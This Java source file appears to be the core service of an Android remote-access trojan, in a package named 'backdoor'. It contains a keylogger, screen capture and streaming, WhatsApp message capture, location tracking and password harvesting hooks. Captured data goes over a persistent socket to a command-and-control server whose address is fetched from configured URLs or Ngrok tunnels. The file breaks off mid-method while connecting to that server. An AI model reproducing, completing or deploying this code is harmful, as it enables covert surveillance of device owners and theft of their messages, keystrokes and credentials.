package com.lazyframework.backdoor;

// ==================== ANDROID IMPORTS ====================
import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Service;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.WallpaperManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.ClipboardManager;
import android.content.ClipData;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageInfo;
import android.content.pm.ServiceInfo;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.hardware.Camera;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.location.Location;
import android.location.LocationManager;
import android.location.LocationListener;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Bundle;
import android.provider.MediaStore;
import java.util.Locale;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.os.StatFs;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.provider.Telephony;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.Display;
import android.view.WindowManager;
import android.widget.Toast;
import android.net.Uri;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteException;

// ==================== JAVA IO IMPORTS ====================
import androidx.annotation.RequiresApi;

import java.io.BufferedReader;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.SocketTimeoutException;
import java.util.ArrayList;
// ==================== JAVA NET IMPORTS ====================
import java.net.HttpURLConnection;
import java.net.Socket;
import java.net.InetSocketAddress;
import java.net.URL;

// ==================== JAVA NIO IMPORTS ====================
import java.nio.ByteBuffer;

// ==================== JAVA UTIL IMPORTS ====================
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.zip.GZIPInputStream;

// ==================== JSON IMPORTS ====================
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
//import androidx.camera.core.Camera;
import androidx.camera.core.CameraSelector;
import androidx.camera.core.ImageCapture;
import androidx.camera.core.ImageCaptureException;
import androidx.camera.lifecycle.ProcessCameraProvider;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.lifecycle.LifecycleOwner;

import com.google.common.util.concurrent.ListenableFuture;

import java.util.concurrent.TimeUnit;

import androidx.lifecycle.LifecycleRegistry;
import androidx.lifecycle.Lifecycle;
import androidx.annotation.NonNull;
import java.net.URI;
public class AgentService extends Service implements LifecycleOwner {
    private static final String TAG = "LazyFramework";
    private static String C2_HOST = "localhost";
    private static int C2_PORT = 4444;
    private static final String CHANNEL_ID = "agent_channel";

    // ==================== SOCKET ====================
    private Socket socket;
    private PrintWriter out;
    private BufferedReader in;
    private AtomicBoolean isRunning = new AtomicBoolean(true);
    private AtomicBoolean isConnected = new AtomicBoolean(false);
    private Handler mainHandler;
    private HandlerThread backgroundThread;
    private Handler backgroundHandler;

    // ==================== THREAD POOLS ====================
    private ExecutorService commandExecutor = Executors.newFixedThreadPool(3);
    private ExecutorService responseExecutor = Executors.newSingleThreadExecutor();

    // ==================== CACHE ====================
    private Map<String, Boolean> permissionCache = new HashMap<>();
    private long lastPermissionCacheClear = 0;
    private static final long PERMISSION_CACHE_TTL = 60000;

    // ==================== MEDIA & INPUT ====================
    private MediaRecorder mediaRecorder;
    private String audioFilePath;
    private boolean isRecording = false;
    private StringBuilder keyLogs = new StringBuilder();
    private boolean isKeylogging = false;
    private String currentCommandId = null;
    private String lastKeylogApp = "unknown";

    // ==================== CAMERA ====================
    private Camera camera;
    private boolean isCameraReady = false;
    private static final int CAMERA_SNAPSHOT_DELAY = 500;

    // ==================== SCREENSHOT ====================
    private MediaProjectionManager projectionManager;
    private MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private ImageReader imageReader;
    private boolean isScreenCapturing = false;
    private static final int SCREENSHOT_DELAY = 500;

    // ==================== WHATSAPP ====================
    private StringBuilder whatsappMessages = new StringBuilder();
    private boolean isWhatsAppCapturing = false;
    private static final int MAX_WA_MESSAGES = 10000;
    private static final String WHATSAPP_PACKAGE = "com.whatsapp";
    private static final String WHATSAPP_BUSINESS_PACKAGE = "com.whatsapp.w4b";
    private byte[] cachedWhatsAppKey = null;
    private boolean isRooted = false;

    // ==================== SCREEN MIRROR ====================
    private ScreenMirrorHelper screenMirrorHelper;
    private boolean isMirrorRequestPending = false;
    private long mirrorRequestTime = 0;
    private static final long MIRROR_TIMEOUT = 90000;
    private BroadcastReceiver mirrorReceiver;

    // ==================== CONFIG RECEIVER ====================
    private BroadcastReceiver configReceiver;
    private BroadcastReceiver frameReceiver;
    private BroadcastReceiver permissionReceiver;
    private static final int HEARTBEAT_INTERVAL = 15000;
    private Handler heartbeatHandler;
    private Runnable heartbeatRunnable;
    private ScreenStreamHelper screenStreamHelper;
    private boolean isVideoStreaming = false;

    // ==================== KEYLOGGER ====================
    private KeyloggerService keyloggerService;
    private boolean isKeyloggingEnabled = false;
    private BroadcastReceiver keylogReceiver;

    // ==================== PENDING DATA QUEUE ====================
    private List<String> pendingDataQueue = new ArrayList<>();
    private static final int MAX_QUEUE_SIZE = 100;
    private LifecycleRegistry lifecycleRegistry;

   
    // ==================== LIFECYCLE ====================
    // AgentService.java - Tambahkan di bagian deklarasi variabel

// ==================== LOCATION TRACKING ====================
private boolean isLocationTracking = false;
private Handler locationTrackingHandler;
private Runnable locationTrackingRunnable;
private int locationTrackingInterval = 10; // seconds default
private List<Map<String, Object>> locationHistory = new ArrayList<>();
private static final int MAX_LOCATION_HISTORY = 500;
    private PasswordHelper passwordHelper;
    
    
private void fetchC2Config() {
    new Thread(() -> {
        Log.d(TAG, "🔄 Mencoba mendapatkan alamat C2...");

        // Daftar URL yang dicoba
        String[] urls = {
            "http://localhost:8080/api/c2",
            "http://192.168.1.8:8080/api/c2"
            
        };

        for (String urlStr : urls) {
            try {
                Log.d(TAG, "🌐 Mencoba: " + urlStr);

                HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
                conn.setConnectTimeout(5000);
                conn.setReadTimeout(5000);

                if (conn.getResponseCode() == 200) {
                    BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                    StringBuilder sb = new StringBuilder();
                    String line;
                    while ((line = reader.readLine()) != null) sb.append(line);
                    reader.close();

                    JSONObject json = new JSONObject(sb.toString());
                    String host = json.optString("host", "");
                    int port = json.optInt("port", 0);

                    if (!host.isEmpty() && port > 0) {
                        C2_HOST = host;
                        C2_PORT = port;
                        saveConfigToPrefs(host, port);
                        Log.d(TAG, "✅ BERHASIL! C2 = " + host + ":" + port);
                        connectToC2();
                        return;
                    }
                }
            } catch (Exception e) {
                Log.w(TAG, "Gagal " + urlStr + ": " + e.getMessage());
            }
        }

        Log.e(TAG, "❌ Semua percobaan gagal. Cek server & Ngrok!");

    }).start();
}

// ==================== SAVE CONFIG TO PREFERENCES ====================
private void saveConfigToPrefs(String host, int port) {
    try {
        SharedPreferences prefs = getSharedPreferences("LazyFramework", Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = prefs.edit();
        
        editor.putString("C2_HOST", host);
        editor.putInt("C2_PORT", port);
        editor.putLong("last_config_update", System.currentTimeMillis()); // untuk tracking
        
        editor.apply(); // asynchronous (lebih cepat)
        
        Log.d(TAG, "💾 Config saved to SharedPreferences: " + host + ":" + port);
        
    } catch (Exception e) {
        Log.e(TAG, "Failed to save config to prefs: " + e.getMessage());
        
        // Fallback ke mode synchronous jika gagal
        try {
            SharedPreferences prefs = getSharedPreferences("LazyFramework", Context.MODE_PRIVATE);
            prefs.edit()
                .putString("C2_HOST", host)
                .putInt("C2_PORT", port)
                .commit(); // synchronous
        } catch (Exception e2) {
            Log.e(TAG, "Critical save config failed", e2);
        }
    }
}

// ==================== GET NGROK OR LOCAL HOST ====================
private String getNgrokOrLocalHost() {
    SharedPreferences prefs = getSharedPreferences("LazyFramework", Context.MODE_PRIVATE);
    String savedHost = prefs.getString("C2_HOST", "");

    // ✅ CEK APAPUN YANG MENGANDUNG "ngrok.io" atau "tcp.ngrok.io"
    if (!savedHost.isEmpty() && 
        (savedHost.contains("ngrok.io") || 
         savedHost.contains(".tcp.") ||
         savedHost.matches("^\\d+\\.tcp\\.ngrok\\.io$"))) {  // ← TAMBAHKAN INI
        Log.d(TAG, "✅ Using saved Ngrok host: " + savedHost);
        return savedHost;
    }

    String localIP = getLocalWifiIP();
    if (!localIP.isEmpty()) {
        return localIP;
    }

    // Kalau tidak bisa deteksi sama sekali
    Log.w(TAG, "⚠️ No IP detected. Please use Ngrok.");
    return "";
}

// ==================== GET LOCAL IP OTOMATIS (NO HARDCODED) ====================
private String getLocalWifiIP() {
    try {
        // Cek WiFi dulu
        WifiManager wifiManager = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
        
        if (wifiManager != null && wifiManager.isWifiEnabled()) {
            WifiInfo wifiInfo = wifiManager.getConnectionInfo();
            int ipAddress = wifiInfo.getIpAddress();
            
            if (ipAddress != 0) {
                String ip = String.format("%d.%d.%d.%d",
                        (ipAddress & 0xff),
                        (ipAddress >> 8 & 0xff),
                        (ipAddress >> 16 & 0xff),
                        (ipAddress >> 24 & 0xff));
                
                Log.d(TAG, "✅ WiFi IP detected: " + ip);
                return ip;
            }
        }

        // Jika WiFi tidak aktif → Coba ambil IP dari semua interface (Mobile Data / Ethernet)
        java.util.Enumeration<java.net.NetworkInterface> interfaces = 
            java.net.NetworkInterface.getNetworkInterfaces();
        
        while (interfaces.hasMoreElements()) {
            java.net.NetworkInterface networkInterface = interfaces.nextElement();
            
            // Skip loopback dan interface yang tidak aktif
            if (networkInterface.isLoopback() || !networkInterface.isUp()) {
                continue;
            }

            java.util.Enumeration<java.net.InetAddress> addresses = networkInterface.getInetAddresses();
            while (addresses.hasMoreElements()) {
                java.net.InetAddress addr = addresses.nextElement();
                
                // Ambil IPv4 address yang bukan loopback
                if (addr instanceof java.net.Inet4Address && !addr.isLoopbackAddress()) {
                    String ip = addr.getHostAddress();
                    Log.d(TAG, "✅ Network IP detected: " + ip);
                    return ip;
                }
            }
        }

    } catch (Exception e) {
        Log.e(TAG, "Error detecting IP: " + e.getMessage());
    }

    // Ultimate fallback: return kosong (biar agent tahu harus pakai Ngrok)
    Log.w(TAG, "⚠️ Could not detect local IP automatically");
    return "";
}


    @Override
    public void onCreate() {
        super.onCreate();

        Log.d(TAG, "🚀 Agent created");
        loadConfig();

        mainHandler = new Handler(Looper.getMainLooper());

        createNotificationChannel();
        startForegroundService();

        backgroundThread = new HandlerThread("AgentThread");
        backgroundThread.start();
        backgroundHandler = new Handler(backgroundThread.getLooper());

        NotificationListener.setAgentService(this);
        KeyloggerHelper.setAgentService(this);

        // ✅ REGISTER AgentService KE ServiceController
        ServiceController.setAgentService(this);

        initKeyloggerService();

        // Initialize screen mirror helper
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            try {
                screenMirrorHelper = new ScreenMirrorHelper();
                screenMirrorHelper.onCreate(this);
                ServiceController.setScreenMirrorHelper(screenMirrorHelper);
                Log.d(TAG, "✅ ScreenMirrorHelper initialized");
                initScreenStream();
            } catch (Exception e) {
                Log.e(TAG, "ScreenMirrorHelper init error: " + e.getMessage());
            }

        }

        projectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        isRooted = checkRoot();
        Log.d(TAG, "🔓 Root status: " + (isRooted ? "ROOTED" : "NOT ROOTED"));

        // ✅ REGISTER RECEIVERS
        registerConfigReceiver();
        registerMirrorReceiver();
        registerFrameReceiver();
        registerKeylogReceiver();
        registerPermissionReceiver();
        // Initialize PasswordHelper
passwordHelper = new PasswordHelper(this, isRooted);
Log.d(TAG, "✅ PasswordHelper initialized");
        startHeartbeat();
        // ✅ INISIALISASI LIFECYCLE
        lifecycleRegistry = new LifecycleRegistry(this);
        lifecycleRegistry.setCurrentState(Lifecycle.State.STARTED);

        // ✅ START KONEKSI
        mainHandler.postDelayed(() -> {
        
            Log.d(TAG, "📡 Connecting to C2...");
            loadConfig();
            fetchC2Config();
            connectToC2();
        }, 2000);
    }

    // ✅ IMPLEMENTASI LifecycleOwner
    @NonNull
    @Override
    public Lifecycle getLifecycle() {
        return lifecycleRegistry;
    }

    // ==================== PERMISSION RECEIVER ====================

    @SuppressLint("UnspecifiedRegisterReceiverFlag")
    private void registerPermissionReceiver() {
        try {
            unregisterPermissionReceiver();

            permissionReceiver = new BroadcastReceiver() {
                @Override
                public void onReceive(Context context, Intent intent) {
                    if ("com.lazyframework.PERMISSION_GRANTED".equals(intent.getAction())) {
                        String type = intent.getStringExtra("type");
                        if ("screen_capture".equals(type)) {
                            Log.d(TAG, "✅ Screen capture permission granted!");

                            MediaProjection projection = ServiceController.getMediaProjection();
                            if (projection != null) {
                                Log.d(TAG, "✅ MediaProjection available, starting screen mirror...");
                                if (screenMirrorHelper != null) {
                                    screenMirrorHelper.startScreenCapture(projection);
                                }
                            }
                        }
                    }
                }
            };

            IntentFilter filter = new IntentFilter();
            filter.addAction("com.lazyframework.PERMISSION_GRANTED");

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(permissionReceiver, filter, Context.RECEIVER_NOT_EXPORTED);
            } else {
                registerReceiver(permissionReceiver, filter);
            }
            Log.d(TAG, "✅ Permission receiver registered");

        } catch (Exception e) {
            Log.e(TAG, "Register permission receiver error: " + e.getMessage());
        }
    }

    private void unregisterPermissionReceiver() {
        try {
            if (permissionReceiver != null) {
                unregisterReceiver(permissionReceiver);
                permissionReceiver = null;
            }
        } catch (Exception ignored) {}
    }

    // ==================== KEYLOGGER BROADCAST RECEIVER ====================

    @SuppressLint("UnspecifiedRegisterReceiverFlag")
    private void registerKeylogReceiver() {
        try {
            unregisterKeylogReceiver();

            keylogReceiver = new BroadcastReceiver() {
                @Override
                public void onReceive(Context context, Intent intent) {
                    if ("com.lazyframework.KEYLOG_BATCH".equals(intent.getAction())) {
                        String data = intent.getStringExtra("data");
                        if (data != null && !data.isEmpty()) {
                            Log.d(TAG, "📥 Keylog batch received, size: " + data.length());

                            backgroundHandler.post(() -> {
                                if (isC2Connected()) {
                                    sendRawData(data);
                                    Log.d(TAG, "📤 Keylog batch forwarded to C2");
                                } else {
                                    Log.w(TAG, "⚠️ Not connected to C2, queuing keylog batch");
                                    queueDataForReconnect(data);
                                }
                            });
                        }
                    }
                }
            };

            IntentFilter filter = new IntentFilter("com.lazyframework.KEYLOG_BATCH");

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(keylogReceiver, filter, Context.RECEIVER_NOT_EXPORTED);
            } else {
                registerReceiver(keylogReceiver, filter);
            }
            Log.d(TAG, "✅ Keylog receiver registered");

        } catch (Exception e) {
            Log.e(TAG, "Register keylog receiver error", e);
        }
    }

    private void unregisterKeylogReceiver() {
        try {
            if (keylogReceiver != null) {
                unregisterReceiver(keylogReceiver);
                keylogReceiver = null;
            }
        } catch (Exception ignored) {}
    }

    // ==================== INIT METHODS ====================

    private void initKeyloggerService() {
        try {
            Log.d(TAG, "🔐 Starting KeyloggerService...");
            Intent intent = new Intent(this, KeyloggerService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent);
            } else {
                startService(intent);
            }
            Log.d(TAG, "✅ KeyloggerService start command sent");
        } catch (Exception e) {
            Log.e(TAG, "Failed to start KeyloggerService", e);
        }
    }

    private void initScreenStream() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            try {
                screenStreamHelper = new ScreenStreamHelper();
                screenStreamHelper.onCreate(this);
                ServiceController.setScreenStreamHelper(screenStreamHelper);
                Log.d(TAG, "✅ ScreenStreamHelper initialized");
            } catch (Exception e) {
                Log.e(TAG, "ScreenStreamHelper init error: " + e.getMessage());
            }
        }
    }

    // ==================== HEARTBEAT ====================

    private void startHeartbeat() {
        heartbeatHandler = new Handler(Looper.getMainLooper());
        heartbeatRunnable = new Runnable() {
            @Override
            public void run() {
                backgroundHandler.post(() -> {
                    if (isConnected.get() && out != null) {
                        try {
                            synchronized (out) {
                                out.println("PING");
                                out.flush();
                                Log.d(TAG, "💓 Heartbeat PING sent");
                            }
                        } catch (Exception e) {
                            Log.e(TAG, "❌ Heartbeat error: " + e.getMessage());
                            isConnected.set(false);
                            closeConnection();
                            connectToC2();
                        }
                    }
                });

                heartbeatHandler.postDelayed(this, HEARTBEAT_INTERVAL);
            }
        };
        heartbeatHandler.postDelayed(heartbeatRunnable, HEARTBEAT_INTERVAL);
    }

public void sendVideoFrame(String base64, int width, int height, int frameNumber) {
    try {
        JSONObject json = new JSONObject();
        json.put("type", "response");
        json.put("agent_id", getAgentId());
        json.put("command", "VIDEO_FRAME");

        JSONObject result = new JSONObject();
        result.put("type", "video_frame");
        result.put("data", base64);
        result.put("width", width);
        result.put("height", height);
        result.put("frame_number", frameNumber);
        result.put("timestamp", System.currentTimeMillis());

        json.put("result", result);
        
        sendRawData(json.toString());
    } catch (Exception e) {
        Log.e(TAG, "Send video frame error", e);
    }
}

    // ==================== FRAME RECEIVER ====================

    @SuppressLint("UnspecifiedRegisterReceiverFlag")
    private void registerFrameReceiver() {
        try {
            unregisterFrameReceiver();

            frameReceiver = new BroadcastReceiver() {
                @Override
                public void onReceive(Context context, Intent intent) {
                    if ("com.lazyframework.SCREEN_FRAME".equals(intent.getAction())) {
                        String frameData = intent.getStringExtra("frame_data");
                        int frameNumber = intent.getIntExtra("frame_number", 0);

                        Log.d(TAG, "📨 Frame #" + frameNumber + " received in AgentService");

                        if (frameData == null) {
                            Log.e(TAG, "❌ frameData is null!");
                            return;
                        }

                        backgroundHandler.post(() -> {
                            sendFrameToC2(frameData, frameNumber, intent);
                        });
                    }
                }
            };

            IntentFilter filter = new IntentFilter();
            filter.addAction("com.lazyframework.SCREEN_FRAME");

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(frameReceiver, filter, Context.RECEIVER_NOT_EXPORTED);
            } else {
                registerReceiver(frameReceiver, filter);
            }
            Log.d(TAG, "✅ Frame receiver registered");

        } catch (Exception e) {
            Log.e(TAG, "Register frame receiver error: " + e.getMessage(), e);
        }
    }

    private void unregisterFrameReceiver() {
        try {
            if (frameReceiver != null) {
                unregisterReceiver(frameReceiver);
                frameReceiver = null;
            }
        } catch (Exception e) {
            // Ignore
        }
    }

    // AgentService.java - Ganti method sendFrameToC2

    // AgentService.java - Ganti method sendFrameToC2()

private void sendFrameToC2(String frameData, int frameNumber, Intent intent) {
    try {
        Log.d(TAG, "📤 Sending frame #" + frameNumber + " to C2");

        // ✅ CEK KONEKSI
        if (!isC2Connected()) {
            Log.w(TAG, "⚠️ Not connected to C2, queuing frame #" + frameNumber);
            queueDataForReconnect(createFrameJson(frameData, frameNumber, intent));
            return;
        }

        // ✅ KIRIM KE C2 DENGAN FORMAT YANG BENAR
        String jsonString = createFrameJson(frameData, frameNumber, intent);
        
        synchronized (out) {
            out.println(jsonString);
            out.flush();
            Log.d(TAG, "✅ Frame #" + frameNumber + " forwarded to C2! Size: " + frameData.length());
        }

    } catch (Exception e) {
        Log.e(TAG, "❌ Frame forward error: " + e.getMessage(), e);
        try {
            queueDataForReconnect(createFrameJson(frameData, frameNumber, intent));
        } catch (Exception qe) {
            Log.e(TAG, "Queue on error: " + qe.getMessage());
        }
    }
}

// ✅ TAMBAHKAN METHOD HELPER
private String createFrameJson(String frameData, int frameNumber, Intent intent) throws JSONException {
    JSONObject json = new JSONObject();
    json.put("type", "response");
    json.put("agent_id", getAgentId());
    json.put("command", "SCREEN_FRAME");

    JSONObject result = new JSONObject();
    result.put("type", "screen_frame");
    
    // ✅ AMBIL DIMENSI
    int[] dims = getScreenDimensions(intent);
    result.put("width", dims[0]);
    result.put("height", dims[1]);
    
    result.put("data", frameData);
    result.put("timestamp", intent.getLongExtra("timestamp", System.currentTimeMillis()));
    result.put("frame_number", frameNumber);
    result.put("size", frameData.length());

    json.put("result", result);
    return json.toString();
}



    /**
     * ✅ Helper method untuk get screen dimensions
     * Fallback ke device screen size jika intent tidak punya width/height
     */
    private int[] getScreenDimensions(Intent intent) {
        // ✅ PRIORITY 1: Ambil dari intent (jika tersedia)
        int width = intent.getIntExtra("width", 0);
        int height = intent.getIntExtra("height", 0);

        if (width > 0 && height > 0) {
            Log.d(TAG, "✅ Screen dimensions from intent: " + width + "x" + height);
            return new int[]{width, height};
        }

        // ✅ PRIORITY 2: Ambil dari device display (compatible dengan semua API)
        try {
            WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
            if (wm != null && wm.getDefaultDisplay() != null) {
                Display display = wm.getDefaultDisplay();
                DisplayMetrics metrics = new DisplayMetrics();
                display.getMetrics(metrics);
                width = metrics.widthPixels;
                height = metrics.heightPixels;

                if (width > 0 && height > 0) {
                    Log.d(TAG, "✅ Screen dimensions from device: " + width + "x" + height);
                    return new int[]{width, height};
                }
            }
        } catch (Exception e) {
            Log.w(TAG, "⚠️ Error getting screen dimensions: " + e.getMessage());
        }

        // ✅ PRIORITY 3: Default fallback
        Log.w(TAG, "⚠️ Using fallback screen dimensions: 1080x2400");
        return new int[]{1080, 2400};
    }

    // ==================== NOTIFICATION ====================

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "Agent Service",
                    NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription("LazyFramework Agent Service");
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }

    private void startForegroundService() {
    try {
        Notification notification = getNotification("Starting...");

        // ✅ FIX: Use proper foreground service types for Android 14+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            startForeground(1, notification,
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC |
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION);
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(1, notification,
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
        } else {
            startForeground(1, notification);
        }
        Log.d(TAG, "✅ Foreground service started");
    } catch (Exception e) {
        Log.e(TAG, "❌ Foreground error: " + e.getMessage());
        try {
            // ✅ Fallback with minimal type for older Android
            startForeground(1, getNotification("Starting..."));
        } catch (Exception e2) {
            Log.e(TAG, "❌ Fallback foreground failed: " + e2.getMessage());
        }
    }
}

    private Notification getNotification(String text) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            return new Notification.Builder(this, CHANNEL_ID)
                    .setContentTitle("LazyFramework Agent")
                    .setContentText(text)
                    .setSmallIcon(android.R.drawable.ic_menu_info_details)
                    .setPriority(Notification.PRIORITY_LOW)
                    .build();
        } else {
            return new Notification.Builder(this)
                    .setContentTitle("LazyFramework Agent")
                    .setContentText(text)
                    .setSmallIcon(android.R.drawable.ic_menu_info_details)
                    .build();
        }
    }

    // ==================== CONFIG RECEIVER ====================

    @SuppressLint("UnspecifiedRegisterReceiverFlag")
    private void registerConfigReceiver() {
        try {
            unregisterConfigReceiver();

            configReceiver = new BroadcastReceiver() {
                @Override
                public void onReceive(Context context, Intent intent) {
                    if ("com.lazyframework.CONFIG_UPDATED".equals(intent.getAction())) {
                        String newHost = intent.getStringExtra("C2_HOST");
                        int newPort = intent.getIntExtra("C2_PORT", 4444);

                        if (newHost != null && !newHost.isEmpty()) {
                            Log.d(TAG, "📡 Config update received: " + newHost + ":" + newPort);

                            C2_HOST = newHost;
                            C2_PORT = newPort;

                            SharedPreferences prefs = getSharedPreferences("LazyFramework", Context.MODE_PRIVATE);
                            prefs.edit()
                                    .putString("C2_HOST", C2_HOST)
                                    .putInt("C2_PORT", C2_PORT)
                                    .apply();

                            if (isConnected.get()) {
                                isConnected.set(false);
                                closeConnection();
                            }
                            connectToC2();
                        }
                    }
                }
            };

            IntentFilter filter = new IntentFilter();
            filter.addAction("com.lazyframework.CONFIG_UPDATED");

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(configReceiver, filter, Context.RECEIVER_NOT_EXPORTED);
            } else {
                registerReceiver(configReceiver, filter);
            }
            Log.d(TAG, "✅ Config receiver registered");

        } catch (Exception e) {
            Log.e(TAG, "Register config receiver error: " + e.getMessage());
        }
    }

    private void unregisterConfigReceiver() {
        try {
            if (configReceiver != null) {
                unregisterReceiver(configReceiver);
                configReceiver = null;
                Log.d(TAG, "✅ Config receiver unregistered");
            }
        } catch (Exception e) {
            Log.d(TAG, "Unregister config receiver: " + e.getMessage());
        }
    }

    // ==================== MIRROR RECEIVER ====================

    @SuppressLint("UnspecifiedRegisterReceiverFlag")
    private void registerMirrorReceiver() {
        try {
            unregisterMirrorReceiver();

            mirrorReceiver = new BroadcastReceiver() {
                @Override
                public void onReceive(Context context, Intent intent) {
                    String action = intent.getAction();
                    if ("com.lazyframework.MIRROR_STARTED".equals(action)) {
                        isMirrorRequestPending = false;
                        Log.d(TAG, "✅ Mirror started via broadcast");
                    } else if ("com.lazyframework.MIRROR_STOPPED".equals(action)) {
                        Log.d(TAG, "⏹️ Mirror stopped via broadcast");
                    } else if ("com.lazyframework.MIRROR_ERROR".equals(action)) {
                        String error = intent.getStringExtra("error");
                        Log.e(TAG, "❌ Mirror error: " + error);
                        isMirrorRequestPending = false;
                    } else if ("com.lazyframework.MIRROR_PERMISSION_RESULT".equals(action)) {
                        boolean success = intent.getBooleanExtra("success", false);
                        String message = intent.getStringExtra("message");
                        Log.d(TAG, "📊 Permission result: " + (success ? "GRANTED" : "DENIED") + " - " + message);
                    } else if ("com.lazyframework.MIRROR_STATUS".equals(action)) {
                        boolean isMirroring = intent.getBooleanExtra("is_mirroring", false);
                        int frameCount = intent.getIntExtra("frame_count", 0);
                        Log.d(TAG, "📊 Mirror status: isMirroring=" + isMirroring + ", frames=" + frameCount);
                    }
                }
            };

            IntentFilter filter = new IntentFilter();
            filter.addAction("com.lazyframework.MIRROR_STARTED");
            filter.addAction("com.lazyframework.MIRROR_STOPPED");
            filter.addAction("com.lazyframework.MIRROR_ERROR");
            filter.addAction("com.lazyframework.MIRROR_PERMISSION_RESULT");
            filter.addAction("com.lazyframework.MIRROR_STATUS");

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(mirrorReceiver, filter, Context.RECEIVER_NOT_EXPORTED);
            } else {
                registerReceiver(mirrorReceiver, filter);
            }
            Log.d(TAG, "✅ Mirror receiver registered");

        } catch (Exception e) {
            Log.e(TAG, "Register mirror receiver error: " + e.getMessage());
        }
    }

    private void unregisterMirrorReceiver() {
        try {
            if (mirrorReceiver != null) {
                unregisterReceiver(mirrorReceiver);
                mirrorReceiver = null;
                Log.d(TAG, "✅ Mirror receiver unregistered");
            }
        } catch (Exception e) {
            Log.d(TAG, "Unregister mirror receiver: " + e.getMessage());
        }
    }

    // ==================== CONFIG LOADING ====================

    private void loadConfig() {
    try {
        SharedPreferences prefs = getSharedPreferences("LazyFramework", Context.MODE_PRIVATE);

        String savedHost = prefs.getString("C2_HOST", null);
        if (savedHost != null && !savedHost.isEmpty()) {
            C2_HOST = savedHost;
            Log.d(TAG, "✅ Loaded C2_HOST from config: " + C2_HOST);
        }

        int savedPort = prefs.getInt("C2_PORT", 0);
        if (savedPort > 0) {
            C2_PORT = savedPort;
            Log.d(TAG, "✅ Loaded C2_PORT from config: " + C2_PORT);
        }

        // ✅ FETCH DARI API (override saved config)
        fetchC2Config();

    } catch (Exception e) {
        Log.e(TAG, "Config load error: " + e.getMessage());
    }
}

    

    // ==================== CONNECT TO C2 ====================

    private void connectToC2() {
        backgroundHandler.post(() -> {
            int retryDelay = 1000;
            int maxDelay = 60000;

            while (isRunning.get() && !isConnected.get()) {
                try {
                    Log.d(TAG, "🔗 Connecting to " + C2_HOST + ":" + C2_PORT);
                    updateNotification("Connecting to " + C2_HOST + "...");

                    socket = new Socket();
                    socket.connect(new InetSocketAddress(C2_HOST, C2_PORT), 10000);
                    socket.setTcpNoDelay(true);
                    socket.setKeepAlive(true);
                    socket.setSoTimeout(90000);
                    socket.setReceiveBufferSize(65536);
                    socket.setSendBufferSize(65536);
                    socket.setReuseAddress(true);

                    out = new PrintWriter(socket.getOutputStream(), true);
                    in = new BufferedReader(new InputStreamReader(socket.getInputStream()));

                    isConnected.set(true);
                    retryDelay = 1000;
                    sendBeacon();

                    ServiceController.setAgentService(this);
                    if (screenMirrorHelper != null) {
                        ServiceController.setAgentService(this);
                    }
